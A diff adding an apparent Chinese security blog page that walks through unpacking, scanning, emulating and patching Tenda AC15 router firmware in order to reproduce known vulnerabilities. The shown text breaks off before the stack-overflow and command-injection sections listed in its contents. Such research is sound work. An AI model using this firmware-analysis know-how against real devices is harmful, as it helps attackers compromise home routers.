@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Tenda AC15漏洞复现 | 南行&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="前言
+基于 “学习漏洞挖掘最好的方法就是复现漏洞本身。” 的思想，所以选择复现 Tenda AC15 的几个漏洞来学习 IOT 漏洞挖掘。
+获取固件
+从官网下载固件：AC15升级软件_腾达(Tenda)官方网站
+
+解压下载的压缩包就可以拿到固件">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/iot/iot-tenda/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.06b120a65aeb9368e0ceaf40b7f104e3773d33d49b58d97f1c5e76995fbc7718.css" integrity="sha256-BrEgplrrk2jgzq9At/EE43c9M9SbWNl/HF52mV&#43;8dxg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="apple-touch-icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="mask-icon" href="http://localhost:1313/assets/favicon.jpg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/posts/iot/iot-tenda/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><script type="text/javascript"
+        async
+        src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$'], ['\[\[','\]\]']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+         extensions: ["AMSmath.js", "AMSsymbols.js"] }
+  }
+});
+
+MathJax.Hub.Queue(function() {
+    
+    
+    
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i = 0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+});
+</script>
+
+<style>
+code.has-jax {
+    font: inherit;
+    font-size: 100%;
+    background: inherit;
+    border: inherit;
+    color: #515151;
+}
+</style>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="南行&#39;s Blog (Alt + H)">南行&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="南行&#39;s Blog">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Tenda AC15漏洞复现
+    </h1>
+    <div class="post-meta"><span title='2025-11-30 23:30:38 +0000 UTC'>2025年11月30日</span>
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#%e5%89%8d%e8%a8%80" aria-label="前言">前言</a></li>
+                    <li>
+                        <a href="#%e8%8e%b7%e5%8f%96%e5%9b%ba%e4%bb%b6" aria-label="获取固件">获取固件</a></li>
+                    <li>
+                        <a href="#%e5%9b%ba%e4%bb%b6%e5%88%86%e6%9e%90" aria-label="固件分析">固件分析</a><ul>
+                            
+                    <li>
+                        <a href="#%e8%a7%a3%e5%8c%85%e5%9b%ba%e4%bb%b6" aria-label="解包固件">解包固件</a></li>
+                    <li>
+                        <a href="#%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86" aria-label="信息搜集">信息搜集</a></li>
+                    <li>
+                        <a href="#%e5%90%af%e5%8a%a8%e9%a1%b9%e5%88%86%e6%9e%90" aria-label="启动项分析">启动项分析</a></li>
+                    <li>
+                        <a href="#%e7%bb%bc%e5%90%88%e5%88%86%e6%9e%90" aria-label="综合分析">综合分析</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%9b%ba%e4%bb%b6%e6%a8%a1%e6%8b%9f" aria-label="固件模拟">固件模拟</a></li>
+                    <li>
+                        <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" aria-label="漏洞复现">漏洞复现</a><ul>
+                            
+                    <li>
+                        <a href="#%e6%a0%88%e6%ba%a2%e5%87%ba" aria-label="栈溢出">栈溢出</a></li>
+                    <li>
+                        <a href="#%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5" aria-label="命令注入">命令注入</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%8f%82%e8%80%83" aria-label="参考">参考</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+  <div class="post-content"><h2 id="前言">前言<a hidden class="anchor" aria-hidden="true" href="#前言">#</a></h2>
+<p>基于 “学习漏洞挖掘最好的方法就是复现漏洞本身。” 的思想，所以选择复现 Tenda AC15 的几个漏洞来学习 IOT 漏洞挖掘。</p>
+<h2 id="获取固件">获取固件<a hidden class="anchor" aria-hidden="true" href="#获取固件">#</a></h2>
+<p>从官网下载固件：<a href="https://www.tenda.com.cn/material/show/102680">AC15升级软件_腾达(Tenda)官方网站</a>
+<img src="/assets/Pasted%20image%2020250514230701.png" style="width: 80%;"></p>
+<p>解压下载的压缩包就可以拿到固件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ unzip ./US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip 
+</span></span><span class="line"><span class="cl">❯ ls
+</span></span><span class="line"><span class="cl">US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin
+</span></span></code></pre></div><h2 id="固件分析">固件分析<a hidden class="anchor" aria-hidden="true" href="#固件分析">#</a></h2>
+<p>接下来我们就可以进行固件的分析，首先我们要解包固件。</p>
+<h3 id="解包固件">解包固件<a hidden class="anchor" aria-hidden="true" href="#解包固件">#</a></h3>
+<p>通过<code>binwalk -Me</code>解包固件。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521174505.png" style="max-width: 100%; height: auto;"></p>
+<p>解包后得到的目录</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521174555.png" style="max-width: 100%; height: auto;"></p>
+<p>通过<code>tree</code>命令快速定位到我们解包固件后获取到的文件系统<code>squashfs-root</code>目录。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521174700.png" style="max-width: 100%; height: auto;"></p>
+<p>然后我们就可以进一步分析。</p>
+<h3 id="信息搜集">信息搜集<a hidden class="anchor" aria-hidden="true" href="#信息搜集">#</a></h3>
+<p>分析固件存在哪些服务，这里我们先通过 Firmwalker 和 Trommel 工具扫一下。</p>
+<ul>
+<li>
+<p>Firmwalker 是一个简单的 Bash 脚本，用于分析已提取或已挂载的固件文件系统。它主要用于查找固件中的潜在安全隐患和敏感信息，帮助安全研究人员快速识别设备中的问题。</p>
+</li>
+<li>
+<p>Trommel 是一个用于分析嵌入式设备文件的工具，旨在通过识别潜在的易受攻击的指示器来帮助安全研究人员发现设备中的漏洞。它可以在固件分析过程中自动检测多种安全隐患，并帮助安全人员对固件中的敏感信息进行识别。</p>
+</li>
+</ul>
+<p>Firmwalker 分析固件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./firmwalker.sh squashfs-root ../firmwalker.txt
+</span></span></code></pre></div><p>Firmwalker 会在固件的文件系统中搜索以下内容：系统账户文件、SSL证书和相关文件、配置文件、脚本文件、其它二进制文件、关键词搜索、常见的IOT服务和软件、URL、电子邮件和 IP 地址。</p>
+<p>它会将分析结果生成为 firmwalker.txt 文件。</p>
+<p>Firmwalker 的分析结果：</p>
+<img src="/assets/Pasted%20image%2020250521202437.png" style="width: 80%;">
+<p>结果近4000行，就不全部展示了。</p>
+<p>TROMMEL 分析固件：</p>
+<pre tabindex="0"><code>trommel.py -p squashfs-roo -o results_output_file -d &lt;directory to save results output file&gt;
+</code></pre><p>TROMMEL 主要识别以下与潜在安全漏洞相关的指标：SSH 密钥文件、SSL 密钥文件、IP 地址、URL、电子邮件地址、Shell 脚本、Web 服务器二进制文件、配置文件、数据库文件、特定二进制文件、共享库文件、Web 应用脚本变量
+、Android 应用包（APK）权限。</p>
+<p>Trommel 的分析结果：</p>
+<img src="/assets/Pasted%20image%2020250521203514.png" style="width: 80%;">
+<p>这个文件更大，有9000行。</p>
+<h3 id="启动项分析">启动项分析<a hidden class="anchor" aria-hidden="true" href="#启动项分析">#</a></h3>
+<p>然后我们分析<code>init.d</code>目录下的文件，它一般在<code>etc</code>或以<code>etc</code>开头的目录下，这个目录通常与系统的初始化和启动过程相关。</p>
+<p>在我们当前固件的目录下只存在一个文件，接下来我们分析这个文件来查看固件启动时做了什么。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ ls etc_ro/init.d
+</span></span><span class="line"><span class="cl">rcS
+</span></span></code></pre></div><ul>
+<li>rcS</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#! /bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">PATH</span><span class="o">=</span>/sbin:/bin:/usr/sbin:/usr/bin/
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> PATH
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mount -t ramfs none /var/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mkdir -p /var/etc
+</span></span><span class="line"><span class="cl">mkdir -p /var/media
+</span></span><span class="line"><span class="cl">mkdir -p /var/webroot
+</span></span><span class="line"><span class="cl">mkdir -p /var/etc/iproute
+</span></span><span class="line"><span class="cl">mkdir -p /var/run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cp -rf /etc_ro/* /etc/
+</span></span><span class="line"><span class="cl">cp -rf /webroot_ro/* /webroot/
+</span></span><span class="line"><span class="cl">mkdir -p /var/etc/upan
+</span></span><span class="line"><span class="cl">mount -a
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mount -t ramfs /dev
+</span></span><span class="line"><span class="cl">mkdir /dev/pts
+</span></span><span class="line"><span class="cl">mount -t devpts devpts /dev/pts
+</span></span><span class="line"><span class="cl">mount -t tmpfs none /var/etc/upan -o <span class="nv">size</span><span class="o">=</span>2M
+</span></span><span class="line"><span class="cl">mdev -s
+</span></span><span class="line"><span class="cl">mkdir /var/run
+</span></span><span class="line"><span class="cl"><span class="c1">#mount -t jffs2 /dev/mtdblock7 /cfg</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;/sbin/mdev&#39;</span> &gt; /proc/sys/kernel/hotplug
+</span></span><span class="line"><span class="cl"><span class="c1">#echo &#39;sd[a-z][0-9] 0:0 0660 @/usr/sbin/autoUsb.sh $MDEV&#39; &gt;&gt; /etc/mdev.conf</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#echo &#39;sd[a-z] 0:0 0660 $/usr/sbin/DelUsb.sh $MDEV&#39; &gt;&gt; /etc/mdev.conf</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#echo &#39;lp[0-9] 0:0 0660 */usr/sbin/IppPrint.sh&#39;&gt;&gt; /etc/mdev.conf</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#wds rule start</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;wds*.* 0:0 0660 */etc/wds.sh $ACTION $INTERFACE&#39;</span> &gt; /etc/mdev.conf
+</span></span><span class="line"><span class="cl"><span class="c1">#wsd rule end</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;sd[a-z][0-9] 0:0 0660 @/usr/sbin/usb_up.sh $MDEV $DEVPATH&#39;</span> &gt;&gt; /etc/mdev.conf
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;-sd[a-z] 0:0 0660 $/usr/sbin/usb_down.sh $MDEV $DEVPATH&#39;</span>&gt;&gt; /etc/mdev.conf
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;sd[a-z] 0:0 0660 @/usr/sbin/usb_up.sh $MDEV $DEVPATH&#39;</span>&gt;&gt; /etc/mdev.conf
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;.* 0:0 0660 */usr/sbin/IppPrint.sh $ACTION $INTERFACE&#39;</span>&gt;&gt; /etc/mdev.conf
+</span></span><span class="line"><span class="cl"><span class="c1">#echo &#39;115.159.183.96 cloud.tenda.com.cn&#39; &gt;&gt; /etc/hosts</span>
+</span></span><span class="line"><span class="cl">mkdir -p /var/ppp
+</span></span><span class="line"><span class="cl">insmod /lib/modules/fastnat.ko
+</span></span><span class="line"><span class="cl">insmod /lib/modules/bm.ko
+</span></span><span class="line"><span class="cl"><span class="c1">#insmod /lib/modules/ai.ko</span>
+</span></span><span class="line"><span class="cl">insmod /lib/modules/mac_filter.ko
+</span></span><span class="line"><span class="cl"><span class="c1">#insmod /lib/modules/ip_mac_bind.ko</span>
+</span></span><span class="line"><span class="cl">insmod /lib/modules/privilege_ip.ko
+</span></span><span class="line"><span class="cl">insmod /lib/modules/qos.ko
+</span></span><span class="line"><span class="cl">insmod /lib/modules/url_filter.ko
+</span></span><span class="line"><span class="cl">insmod /lib/modules/loadbalance.ko
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;0 0 0 0&#34;</span>&gt;/proc/sys/kernel/printk
+</span></span><span class="line"><span class="cl"><span class="c1">#insmod /lib/modules/app_filter.ko</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#insmod /lib/modules/port_filter.ko</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#insmod /lib/modules/arp_fence.ko</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#insmod /lib/modules/ddos_ip_fence.ko</span>
+</span></span><span class="line"><span class="cl">insmod /lib/modules/jnl.ko
+</span></span><span class="line"><span class="cl">insmod /lib/modules/ufsd.ko
+</span></span><span class="line"><span class="cl">insmod /lib/modules/fastnat_configure.ko
+</span></span><span class="line"><span class="cl">chmod +x /etc/mdev.conf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cfmd <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;&#39;</span> &gt; /proc/sys/kernel/hotplug
+</span></span><span class="line"><span class="cl">udevd <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl">logserver <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">tendaupload <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> -e /etc/nginx/conf/nginx_init.sh <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    sh /etc/nginx/conf/nginx_init.sh
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">moniter <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl">telnetd <span class="p">&amp;</span>
+</span></span></code></pre></div><p>这是一个 shell 文件，做了很多初始化和配置，接下来我们就拣主要的说。</p>
+<ul>
+<li>创建<code>/var/etc</code>、<code>/var/media</code>、<code>/var/webroot</code>、<code>/var/etc/iproute</code>、<code>/var/run</code>等目录</li>
+<li>将<code>/etc_ro/</code>目录下的所有文件复制到<code>/etc/</code>目录</li>
+<li>将<code>/webroot_ro</code>目录下的所有文件复制到<code>/webroot</code>目录</li>
+<li>如果<code>/etc/nginx/conf/nginx_init.sh</code> 文件存在，则执行它</li>
+<li>启动 telnetd 服务</li>
+</ul>
+<h3 id="综合分析">综合分析<a hidden class="anchor" aria-hidden="true" href="#综合分析">#</a></h3>
+<p>综合信息收集的结果和初始化文件的信息，判断目标固件存在以下服务：</p>
+<ul>
+<li>Web：
+<ul>
+<li>程序文件：/bin/httpd</li>
+<li>配置文件：/etc_ro/nginx/conf/nginx.conf</li>
+</ul>
+</li>
+<li>FTP：
+<ul>
+<li>程序文件：/bin/httpd</li>
+<li>配置文件：/etc_ro/vsftpd.conf</li>
+</ul>
+</li>
+<li>Samba：
+<ul>
+<li>程序文件：/usr/sbin/smbd</li>
+<li>配置文件：/etc_ro/smb.conf</li>
+</ul>
+</li>
+<li>Telnet：
+<ul>
+<li>程序文件：/usr/sbin/telnetd</li>
+</ul>
+</li>
+<li>PPP：
+<ul>
+<li>程序文件：/bin/pppd</li>
+</ul>
+</li>
+<li>minidlna：
+<ul>
+<li>程序文件：/bin/minidlna</li>
+</ul>
+</li>
+</ul>
+<p>根据分析的结果我们就可以进一步分析可能存在漏洞的地方。</p>
+<ul>
+<li>分析 httpd 是否存在二进制漏洞</li>
+<li>分析服务配置是否存在逻辑漏洞</li>
+</ul>
+<p>我们这里进行漏洞复现，主要复现的就是 httpd 中存在的二进制漏洞。</p>
+<p>下面我们就要研究如何进行固件模拟。</p>
+<h2 id="固件模拟">固件模拟<a hidden class="anchor" aria-hidden="true" href="#固件模拟">#</a></h2>
+<p>对 httpd 进行固件模拟，首先我们知道查看 httpd 是什么架构的二进制文件。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521210447.png" style="max-width: 100%; height: auto;"></p>
+<p>file 查看发现 httpd 为 arm 32位小端序，这样我们就需要模拟一个 arm 32位小端序的可执行环境来模拟固件。</p>
+<p>模拟固件可以通过 qemu 或 qiling 框架来进行模拟，这里我们就直接选择 qemu 来模拟。</p>
+<p>我们首先复制 qemu-arm-static 到当前目录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cp /usr/bin/qemu-arm-static ./ 
+</span></span></code></pre></div><p>然后通过以下命令模拟文件。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">chroot . ./qemu-arm-static ./bin/httpd     
+</span></span></code></pre></div><blockquote>
+<p><code>chroot</code>是一种改变进程根目录的命令，它将进程的工作目录限制为指定的目录。在这里，<code>chroot .</code> 将当前目录（也就是固件的根目录）作为新的根文件系统挂载点，从而模拟固件的执行环境。</p>
+</blockquote>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521210938.png" style="max-width: 100%; height: auto;"></p>
+<p>这里我们模拟之后发现程序直接卡在这里了，这样我们就需要逆向程序分析为什么会卡在那里。</p>
+<p>通过 ida 逆向分析，然后通过<code>Welcome to ...</code>字符串定位程序卡住的地方。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521211519.png" style="max-width: 100%; height: auto;"></p>
+<p>定位到代码位置。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521215245.png" style="max-width: 100%; height: auto;"></p>
+<p>在字符串上条指令打个断点，然后动态调试分析程序。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521215613.png" style="max-width: 100%; height: auto;"></p>
+<p>通过 qemu 的<code>-g</code>参数开启调试模式模拟程序。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521215403.png" style="max-width: 100%; height: auto;"></p>
+<p>然后通过 ida 连接进行动态调试</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521215450.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521215520.png" style="max-width: 100%; height: auto;"></p>
+<p>启动调试后直接 F9 运行到断点处，然后单步调试分析。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521220230.png" style="max-width: 100%; height: auto;"></p>
+<p>经过反复调试后我们发现程序卡在了这个<code>sleep</code>函数这里，它不断的跳转到<code>loc_2E504</code>然后<code>loc_2E504</code>又跳转到它。</p>
+<p>这里我们需要程序执行下去可以通过 patch 的方式，就是对程序进行修改，这里我们可以直接修改<code>BGT</code>指令（判断标志位是否为<code>N=0</code>和<code>Z=0</code>）。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521220627.png" style="max-width: 100%; height: auto;"></p>
+<p>而很明显我们这里的条件是不满足的，所以我们可以<code>BGT</code>指令修改为<code>B</code>指令（无条件跳转）。</p>
+<p>通过 keypatch 插件修改：</p>
+<p>这里需要先把调试停下。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521220825.png" style="max-width: 100%; height: auto;"></p>
+<p>修改后。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250521221234.png" style="max-width: 100%; height: auto;"></p>
+<p>然后保存修改到文件。</p>
+<p>点击 Apply patches to input file&hellip;</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250610233110.png" style="max-width: 100%; height: auto;"></p>
+<p>然后点击 OK 即可。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250610233138.png" style="max-width: 100%; height: auto;"></p>
+<p>再次进行模拟，这次卡在了一个新的地方。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250610233227.png" style="max-width: 100%; height: auto;"></p>
+<p>httpd 监听了 ip 255.255.255.255 的 80 端口。但是这个 ip 地址根本不可以使用，所以我们需要找到修改它的方法。</p>
+<p>根据<code>listen ip</code>字符串进行定位。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250610233619.png" style="max-width: 100%; height: auto;"></p>
+<p>交叉引用发现程序使用了一个<code>inet_ntoa</code>函数处理<code>s.sa_data[2]</code>这个值，处理结果就是 ip 地址。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250610233809.png" style="max-width: 100%; height: auto;"></p>
+<p>这里直接问 GPT <code>inet_ntoa</code>函数的作用。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250610233910.png" style="max-width: 100%; height: auto;"></p>
+<p>这里我们知道了<code>inet_ntoa</code>函数的作用，接下来我们需要知道参数是哪里来的，怎么控制参数才是影响 ip 地址值的关键。</p>
+<p>交叉引入发现参数<code>s.sa_data[2]</code>的几个操作处：</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250610234446.png" style="max-width: 100%; height: auto;"></p>
+<p>发现对<code>s.sa_data[2]</code>赋值的操作是<code>inet_addr(a1)</code>，所以我们需要知道<code>inet_addr</code>函数的作用。</p>
+<p>再次询问 GPT：</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250610234912.png" style="max-width: 100%; height: auto;"></p>
+<p>所以这里控制 ip 值变量就是<code>inet_addr</code>函数的变量<code>a1</code>，<code>a1</code>变量是当前函数的第一个参数。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250610235107.png" style="max-width: 100%; height: auto;"></p>
+<p>所以我们交叉引入当前函数，观察函数的第一个参数传递的内容。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250610235155.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250610235208.png" style="max-width: 100%; height: auto;"></p>
